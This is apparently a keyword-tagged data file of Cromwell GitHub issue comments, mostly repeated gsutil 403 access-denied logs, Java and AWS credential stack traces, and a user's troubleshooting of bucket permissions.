Security,"s/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; 2017/02/07 15:42:00 E: command failed: AccessDeniedException: 403; Caller does not have storage.objects.list access to bucket; firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred.; (exit status 1); 2017/02/07 15:42:00 W: cp failed: gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list,; command failed: AccessDeniedException: 403 Caller does not have; storage.objects.list access to bucket firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred. 2017/02/07 15:42:16 I: Running command: sudo gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; 2017/02/07 15:42:17 E: command failed: AccessDeniedException: 403; Caller does not have storage.objects.list access to bucket; firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred.; (exit status 1); 2017/02/07 15:42:17 W: cp failed: gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sap",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974:4320,Access,AccessDeniedException,4320,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974,1,['Access'],['AccessDeniedException']
Security,"s/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; 2017/02/07 15:42:17 E: command failed: AccessDeniedException: 403; Caller does not have storage.objects.list access to bucket; firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred.; (exit status 1); 2017/02/07 15:42:17 W: cp failed: gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list,; command failed: AccessDeniedException: 403 Caller does not have; storage.objects.list access to bucket firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred. 2017/02/07 15:42:40 I: Running command: sudo gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; 2017/02/07 15:42:41 E: command failed: AccessDeniedException: 403; Caller does not have storage.objects.list access to bucket; firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred.; (exit status 1); 2017/02/07 15:42:41 W: cp failed: gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sap",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974:5574,Access,AccessDeniedException,5574,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974,1,['Access'],['AccessDeniedException']
Security,"s/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; 2017/02/07 15:42:41 E: command failed: AccessDeniedException: 403; Caller does not have storage.objects.list access to bucket; firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred.; (exit status 1); 2017/02/07 15:42:41 W: cp failed: gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list,; command failed: AccessDeniedException: 403 Caller does not have; storage.objects.list access to bucket firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred. 2017/02/07 15:43:11 I: Running command: sudo gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; 2017/02/07 15:43:12 E: command failed: AccessDeniedException: 403; Caller does not have storage.objects.list access to bucket; firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred.; (exit status 1); 2017/02/07 15:43:12 W: cp failed: gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sap",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974:6828,Access,AccessDeniedException,6828,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974,1,['Access'],['AccessDeniedException']
Security,"s/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; 2017/02/07 15:43:12 E: command failed: AccessDeniedException: 403; Caller does not have storage.objects.list access to bucket; firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred.; (exit status 1); 2017/02/07 15:43:12 W: cp failed: gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list,; command failed: AccessDeniedException: 403 Caller does not have; storage.objects.list access to bucket firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred. 2017/02/07 15:43:42 I: Running command: sudo gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; 2017/02/07 15:43:43 E: command failed: AccessDeniedException: 403; Caller does not have storage.objects.list access to bucket; firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred.; (exit status 1); 2017/02/07 15:43:43 W: cp failed: gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sap",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974:8082,Access,AccessDeniedException,8082,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974,1,['Access'],['AccessDeniedException']
Security,"s/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; 2017/02/07 15:43:43 E: command failed: AccessDeniedException: 403; Caller does not have storage.objects.list access to bucket; firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred.; (exit status 1); 2017/02/07 15:43:43 W: cp failed: gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list,; command failed: AccessDeniedException: 403 Caller does not have; storage.objects.list access to bucket firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred. 2017/02/07 15:44:13 I: Running command: sudo gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; 2017/02/07 15:44:14 E: command failed: AccessDeniedException: 403; Caller does not have storage.objects.list access to bucket; firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred.; (exit status 1); 2017/02/07 15:44:14 W: cp failed: gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sap",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974:9336,Access,AccessDeniedException,9336,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974,1,['Access'],['AccessDeniedException']
Security,"s/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; 2017/02/07 15:44:14 E: command failed: AccessDeniedException: 403; Caller does not have storage.objects.list access to bucket; firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred.; (exit status 1); 2017/02/07 15:44:14 W: cp failed: gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list,; command failed: AccessDeniedException: 403 Caller does not have; storage.objects.list access to bucket firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred. 2017/02/07 15:44:44 I: Running command: sudo gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; 2017/02/07 15:44:46 E: command failed: AccessDeniedException: 403; Caller does not have storage.objects.list access to bucket; firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred.; (exit status 1); 2017/02/07 15:44:46 W: cp failed: gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sap",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974:10590,Access,AccessDeniedException,10590,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974,1,['Access'],['AccessDeniedException']
Security,"s/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; 2017/02/07 15:44:46 E: command failed: AccessDeniedException: 403; Caller does not have storage.objects.list access to bucket; firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred.; (exit status 1); 2017/02/07 15:44:46 W: cp failed: gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list,; command failed: AccessDeniedException: 403 Caller does not have; storage.objects.list access to bucket firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred. 2017/02/07 15:45:16 I: Running command: sudo gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; 2017/02/07 15:45:17 E: command failed: AccessDeniedException: 403; Caller does not have storage.objects.list access to bucket; firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred.; (exit status 1); 2017/02/07 15:45:17 W: cp failed: gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sap",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974:11844,Access,AccessDeniedException,11844,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974,1,['Access'],['AccessDeniedException']
Security,"s/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; 2017/02/07 15:45:17 E: command failed: AccessDeniedException: 403; Caller does not have storage.objects.list access to bucket; firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred.; (exit status 1); 2017/02/07 15:45:17 W: cp failed: gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list,; command failed: AccessDeniedException: 403 Caller does not have; storage.objects.list access to bucket firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred. 2017/02/07 15:45:47 I: Running command: sudo gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; 2017/02/07 15:45:48 E: command failed: AccessDeniedException: 403; Caller does not have storage.objects.list access to bucket; firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred.; (exit status 1); 2017/02/07 15:45:48 W: cp failed: gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sap",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974:13098,Access,AccessDeniedException,13098,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974,1,['Access'],['AccessDeniedException']
Security,"s/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; 2017/02/07 15:45:48 E: command failed: AccessDeniedException: 403; Caller does not have storage.objects.list access to bucket; firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred.; (exit status 1); 2017/02/07 15:45:48 W: cp failed: gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list,; command failed: AccessDeniedException: 403 Caller does not have; storage.objects.list access to bucket firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred. 2017/02/07 15:45:48 I: Copying /var/log/google-genomics/*.log to; gs://broad-dsde-methods/lichtens/cromwell-executions-test_dl_oxoq/bamsurgeon_workflow/f6f01c57-23e2-4d29-854a-0d39c11ff950/call-generate_true_positives/; 2017/02/07 15:45:48 I: Running command: sudo gsutil -h; Content-type:text/plain -q -m cp /var/log/google-genomics/*.log; gs://broad-dsde-methods/lichtens/cromwell-executions-test_dl_oxoq/bamsurgeon_workflow/f6f01c57-23e2-4d29-854a-0d39c11ff950/call-generate_true_positives/; 2017/02/07 15:46:18 I: Copying /var/log/google-genomics/*.log to; gs://broad-dsde-methods/lichtens/cromwell-executions-test_dl_oxoq/bamsurgeon_workflow/f6f01c57-23e2-4d29-854a-0d39c11ff950/call-generate_true_positives/; 2017/02/07 15:46:18 I: Running command: sudo gsutil -h; Content-type:text/plain -q -m cp /var/log/google-genomics/*.log; gs:",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974:14352,Access,AccessDeniedException,14352,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974,1,['Access'],['AccessDeniedException']
Security,services.AbstractGoogleClientRequest.executeUnparsed(AbstractGoogleClientRequest.java:352) ~[cromwell.jar:0.19]; 905170- at com.google.api.client.googleapis.services.AbstractGoogleClientRequest.execute(AbstractGoogleClientRequest.java:469) ~[cromwell.jar:0.19]; 905171- at cromwell.engine.backend.io.filesystem.gcs.GcsFileSystemProvider$$anonfun$crc32cHash$1.apply(GcsFileSystemProvider.scala:191) ~[cromwell.jar:0.19]; 905172- at cromwell.engine.backend.io.filesystem.gcs.GcsFileSystemProvider$$anonfun$crc32cHash$1.apply(GcsFileSystemProvider.scala:191) ~[cromwell.jar:0.19]; 905173- at scala.util.Try$.apply(Try.scala:192) ~[cromwell.jar:0.19]; 905174- at cromwell.engine.backend.io.filesystem.gcs.GcsFileSystemProvider$.withRetry(GcsFileSystemProvider.scala:44) ~[cromwell.jar:0.19]; 905175- at cromwell.engine.backend.io.filesystem.gcs.GcsFileSystemProvider.crc32cHash(GcsFileSystemProvider.scala:191) ~[cromwell.jar:0.19]; 905176- at cromwell.engine.backend.io.package$PathEnhanced$.hash$extension(package.scala:32) ~[cromwell.jar:0.19]; 905177- at cromwell.engine.backend.WorkflowDescriptor$$anonfun$fileHasher$1.apply(WorkflowDescriptor.scala:65) ~[cromwell.jar:0.19]; 905178- at cromwell.engine.backend.WorkflowDescriptor$$anonfun$fileHasher$1.apply(WorkflowDescriptor.scala:63) ~[cromwell.jar:0.19]; 905179- at wdl4s.values.WdlValue$class.computeHash(WdlValue.scala:63) ~[cromwell.jar:0.19]; 905180- at wdl4s.values.WdlSingleFile.computeHash(WdlFile.scala:39) ~[cromwell.jar:0.19]; 905181- at cromwell.engine.backend.WorkflowDescriptor.hash(WorkflowDescriptor.scala:229) ~[cromwell.jar:0.19]; 905182- at cromwell.engine.backend.jes.JesBackend$$anonfun$postProcess$1$$anonfun$apply$14.apply(JesBackend.scala:627) ~[cromwell.jar:0.19]; 905183- at cromwell.engine.backend.jes.JesBackend$$anonfun$postProcess$1$$anonfun$apply$14.apply(JesBackend.scala:626) ~[cromwell.jar:0.19]; 905184- at scala.collection.MapLike$MappedValues$$anonfun$foreach$3.apply(MapLike.scala:245) ~[cromwell.jar:0.19]; 9,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/738#issuecomment-214521102:3299,hash,hash,3299,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/738#issuecomment-214521102,1,['hash'],['hash']
Security,"sooo we were saying in standup today we probably want to do away with that whole Docker hash lookup business, which would seem to have more than a bit of impact on this PR... 😦",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1326#issuecomment-242146999:88,hash,hash,88,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1326#issuecomment-242146999,1,['hash'],['hash']
Security,surgeon_workflow/f6f01c57-23e2-4d29-854a-0d39c11ff950/call-generate_true_positives/exec.sh; /mnt/local-disk/exec.sh; 2017/02/07 15:41:49 I: Docker file; /cromwell_root/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; maps to host location; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list.; 2017/02/07 15:41:49 I: Copying; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; to /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; 2017/02/07 15:41:49 I: Running command: sudo gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; 2017/02/07 15:41:50 E: command failed: AccessDeniedException: 403; Caller does not have storage.objects.list access to bucket; firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred.; (exit status 1); 2017/02/07 15:41:50 W: cp failed: gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_lis,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974:2073,access,access,2073,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974,1,['access'],['access']
Security,"t least that's fully clarified. However I still get the error:; ```; 2020/07/28 21:30:43 Localizing input gs://fc-118c254f-010a-4ee6-b149-6f0bb5abaa77/GeneticNeuroscience_McCarroll_CIRM_GRU_Exome_9qCN-LOH_PDO-21129/RP-1875/Exome/CW60141_P13_MT_1-19-18/v1/CW60141_P13_MT_1-19-18.cram -> /cromwell_root/fc-118c254f-010a-4ee6-b149-6f0bb5abaa77/GeneticNeuroscience_McCarroll_CIRM_GRU_Exome_9qCN-LOH_PDO-21129/RP-1875/Exome/CW60141_P13_MT_1-19-18/v1/CW60141_P13_MT_1-19-18.cram; Error attempting to localize file with command: 'mkdir -p '/cromwell_root/fc-118c254f-010a-4ee6-b149-6f0bb5abaa77/GeneticNeuroscience_McCarroll_CIRM_GRU_Exome_9qCN-LOH_PDO-21129/RP-1875/Exome/CW60141_P13_MT_1-19-18/v1/' && rm -f /root/.config/gcloud/gce && gsutil -o 'GSUtil:parallel_thread_count=1' -o 'GSUtil:sliced_object_download_max_components=1' cp 'gs://fc-118c254f-010a-4ee6-b149-6f0bb5abaa77/GeneticNeuroscience_McCarroll_CIRM_GRU_Exome_9qCN-LOH_PDO-21129/RP-1875/Exome/CW60141_P13_MT_1-19-18/v1/CW60141_P13_MT_1-19-18.cram' '/cromwell_root/fc-118c254f-010a-4ee6-b149-6f0bb5abaa77/GeneticNeuroscience_McCarroll_CIRM_GRU_Exome_9qCN-LOH_PDO-21129/RP-1875/Exome/CW60141_P13_MT_1-19-18/v1/''; AccessDeniedException: 403 xxx@xxx.gserviceaccount.com does not have storage.objects.list access to the Google Cloud Storage bucket.; ```; I am starting to guess that this is a settings issue with the bucket, not with my service account. My best guess is that, albeit extremely counter-intuitive, I have access to this bucket with my personal account but I do not have access to this bucket with my service account. Oh my, this is so complicated ... As for Terra, I have used it quite a bit for the last week but, and I am not alone in saying this, Terra is not a good environment for development of new WDLs. For example, just to upload a new WDL for testing it takes so many steps. Maybe once you have a polished WDL it is great for users with less technical expertise. But I want to use Cromwell to develop and test new WDLs.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5594#issuecomment-665298885:2619,Access,AccessDeniedException,2619,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5594#issuecomment-665298885,7,"['Access', 'access']","['AccessDeniedException', 'access']"
Security,"t software.amazon.awssdk.core.client.builder.SdkDefaultClientBuilder.resolveSyncHttpClient(SdkDefaultClientBuilder.java:245); 	at software.amazon.awssdk.core.client.builder.SdkDefaultClientBuilder.finalizeSyncConfiguration(SdkDefaultClientBuilder.java:210); 	at software.amazon.awssdk.core.client.builder.SdkDefaultClientBuilder.syncClientConfiguration(SdkDefaultClientBuilder.java:148); 	at software.amazon.awssdk.services.sts.DefaultStsClientBuilder.buildClient(DefaultStsClientBuilder.java:27); 	at software.amazon.awssdk.services.sts.DefaultStsClientBuilder.buildClient(DefaultStsClientBuilder.java:22); 	at software.amazon.awssdk.core.client.builder.SdkDefaultClientBuilder.build(SdkDefaultClientBuilder.java:119); 	at cromwell.cloudsupport.aws.auth.AwsAuthMode.$anonfun$credentialValidation$1(AwsAuthMode.scala:77); 	at cromwell.cloudsupport.aws.auth.AwsAuthMode.$anonfun$credentialValidation$1$adapted(AwsAuthMode.scala:69); 	at cromwell.cloudsupport.aws.auth.AwsAuthMode.$anonfun$validateCredential$1(AwsAuthMode.scala:84); 	at scala.runtime.java8.JFunction0$mcV$sp.apply(JFunction0$mcV$sp.java:12); 	at scala.util.Try$.apply(Try.scala:209); 	at cromwell.cloudsupport.aws.auth.AwsAuthMode.validateCredential(AwsAuthMode.scala:84); 	... 48 common frames omitted; 2019-07-02 19:16:37,967 cromwell-system-akka.dispatchers.engine-dispatcher-30 ERROR - WorkflowManagerActor Workflow 10f172e8-b7ba-416f-964e-22ab8c7b38e3 failed (during MaterializingWorkflowDescriptorState): java.lang.RuntimeException: Credentials are invalid: software.amazon.awssdk.http.SdkHttpService: Provider software.amazon.awssdk.http.apache.ApacheSdkHttpService not found; 	at cromwell.cloudsupport.aws.auth.AwsAuthMode.validateCredential(AwsAuthMode.scala:85); 	at cromwell.cloudsupport.aws.auth.AwsAuthMode.validateCredential$(AwsAuthMode.scala:83); 	at cromwell.cloudsupport.aws.auth.DefaultMode.validateCredential(AwsAuthMode.scala:116); 	at 